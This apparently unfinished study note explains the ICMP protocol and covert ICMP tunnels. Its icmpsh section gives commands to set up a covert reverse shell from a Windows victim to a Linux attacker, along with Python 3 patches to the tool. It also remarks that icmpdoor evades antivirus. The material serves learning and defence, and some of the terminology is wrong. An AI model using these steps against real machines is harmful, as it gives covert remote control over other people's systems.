```
document under construction
```
# Basics

ICMP (or the Internet Control Message Protocol) is an upper layer 3 protocol.


It is commonly used for diagnostic purposes (ping and traceroute).


ICMP for IPv4 is specified in [rfc792](https://www.rfc-editor.org/rfc/rfc792) and ICMP for IPv6 (ICMPv6) is specified in [rfc4443](https://www.rfc-editor.org/rfc/rfc4443).

![ICMP over IPv4 structure](ICMP_diagram.png)

20 Byte IPv4 Header + 8 Byte ICMP fields + data (optional depending on the ICMP type)

IPv4 type of service (TOS): 0

IPv4 protocol: 1


ICMP Types:
- 0  Echo Reply
- 3  Destination Unreachable
- 4  Source Quench
- 5  Redirect
- 8  Echo
- 11  Time Exceeded
- 12  Parameter Problem
- 13  Timestamp
- 14  Timestamp Reply
- 15  Information Request
- 16  Information Reply

# Examples for ICMP echo request and ICMP echo reply
Windows 10 on a LAN pinging Cloudflare DNS server on the public internet (echo request | type 8).

![ICMP echo request](/ICMP_echo_request_example_Windows.png)

Cloudflare DNS server responding to the request (echo reply | type 0).

![ICMP echo request](/ICMP_echo_reply_example_Windows.png)

Ubuntu on a LAN pinging Google DNS server on the public internet (echo request | type 8).

![ICMP echo request](/ICMP_echo_request_example_Ubuntu.png)

Google DNS server responding to the request (echo reply | type 0).

![ICMP echo request](/ICMP_echo_reply_example_Ubuntu.png)

# ICMP data
Windows sends the alphabet (small letters) ~1,27 times (32 bytes).

Ubuntu sends a total of 48 bytes from which only the last 24 bytes have a graphical representation.

## Could something else be send as ICMP request/reply data?
Yes!

For starters with some ping utilities, you can adjust the length of the ICMP data.

Other programs let you send a custom text as ICMP data.

Some early research on what can be done with the data transmitted in ICMP requests and reply includes [project Loki](https://web.archive.org/web/20030316090229/http://www.phrack.com/show.php?p=49&a=6). In this project from 1996 the posibility of a covert channel via the ICMP protocol was discussed. Covert channels can be grouped into two categories:

- timing channel (sub-categories: interval based, time-replay, model-based, JitterBug, ...)
- storage channel (in networking use of optional or unused protocol fields)

# ICMP Tunnel
An ICMP Tunnel uses a covert storage channel with the data field in the ICMP requests and replies. 

ICMP tunnels have two general usecases:
- reverse-shell
- ip over icmp

## Reverse-shell
In a typical remote shell scenario a user would establish a connection with a client to a server. The server is listening for connection-requests. When the client is connected to the server the user can access the resources of the server.

A reverse-shell is the oposite of a remote shell. Instead of the server being the source of the shell the client gets to be the source of the shell. And the server is the one with which the user can control the client. This is also called a command and conquer (c&c) attack.

### icmpsh

[icmpsh](https://github.com/bdamele/icmpsh) is available on GitHub under the GNU Lesser General Public License.

The demonstration involves an Ubuntu GNU/Linux computer as the attacker and a Windows computer as the victim.

#### ***requirements***
- Windows computer as the victim (client)
- POSIX compatible computer (like a GNU/Linux distribution) as the attacker (server)

#### ***install***
prerequisites (attacker only): 
- python is python 3
- python3 impacket
```
sudo apt install python-is-python3
sudo apt install python3-impacket
```
#### ***configuration (attacker only)***
It is necesarry to either put the following command at the end of the `/etc/sysctl.conf` file or execute it before executing the actual program:
```
sudo sysctl -w net.ipv4.icmp_echo_ignore_all=1
```

The following changes where done to the `icmpsh_m.py` file to be able to execute it with python 3:
- line 40 was changed from 
  > if subprocess.mswindows:
  
  to
  > if subprocess._mswindows:
  
- line 60 was changed from 
  > except socket.error, e:
  
  to
  > except socket.error(e):
  
- line 103 was changed from
  > sys.stdout.write(data)
  
  to
  > sys.stdout.write(data.decode("iso8859-1"))
  
- line 119 was chaged from
  > icmp.contains(ImpactPacket.Data(cmd))
  
  to
  > icmp.contains(ImpactPacket.Data(bytes(cmd, 'iso8859-1')))
  
#### ***execution (attacker and victim)***
For the icmpsh server (the attacker) use the following command from the icmpsh master folder:
```
sudo ./icmpsh_m.py <attacker_ip> <victim_ip>
```
For the icmpsh client (victim) use the following command from the icmpsh master folder:
```
icmpsh.exe -t <attacker_ip>
```

#### ***downsites of icmpsh***
- icmpsh traffic is unencrypted in the data field of the icmp requests and replies
- only targets windows computers

### icmpdoor
icmpdoor is another more modern icmp based reverse-shell program.

[icmpdoor](https://github.com/krabelize/icmpdoor) is vavailable on GitHub under the BSD 3-Clause License.

improvements over icmpsh:
- the attacker can use Windows or GNU/Linux
- the victim can be a Windows or a GNU/Linux mashine

## ip over icmp
With ip over icmp ipv4 data trafic can be hidden in icmp packets.
This can for example be used to circumvent captive portals.

### hans


## Mitigation
- up to date anti-virus
  - this can help against mallicious client software for c&c attacks
  - icmpsh gets detected by several ani-virus softwares (checked with virustotal.com) and even by Windows Defender
  - but icmpdoor doesn't get detected by practically any anti-virus software (checked with virustotal.com) 

# Sources

https://en.wikipedia.org/wiki/IPv4

https://www.elektronik-kompendium.de/sites/net/2011241.htm

https://homepages.uc.edu/~thomam/Net1/Packet_Formats/icmp.html

https://www.ionos.at/digitalguide/server/knowhow/was-ist-das-icmp-protokoll-und-wie-funktioniert-es/

https://www.elektronik-kompendium.de/sites/net/0901011.htm

https://www.javatpoint.com/computer-network-tcp-ip-model

https://www.rfc-editor.org/rfc/rfc792

https://link.springer.com/chapter/10.1007/3-540-45067-X_20

https://web.archive.org/web/20030316090229/http://www.phrack.com/show.php?p=49&a=6

https://ieeexplore.ieee.org/document/8308433

https://ieeexplore.ieee.org/document/5590253

https://stackoverflow.com/questions/3655306/ubuntu-usr-bin-env-python-no-such-file-or-directory

https://www.cynet.com/attack-techniques-hands-on/how-hackers-use-icmp-tunneling-to-own-your-network/

https://www.acunetix.com/blog/web-security-zone/what-is-reverse-shell/

https://cryptsus.com/blog/icmp-reverse-shell.html
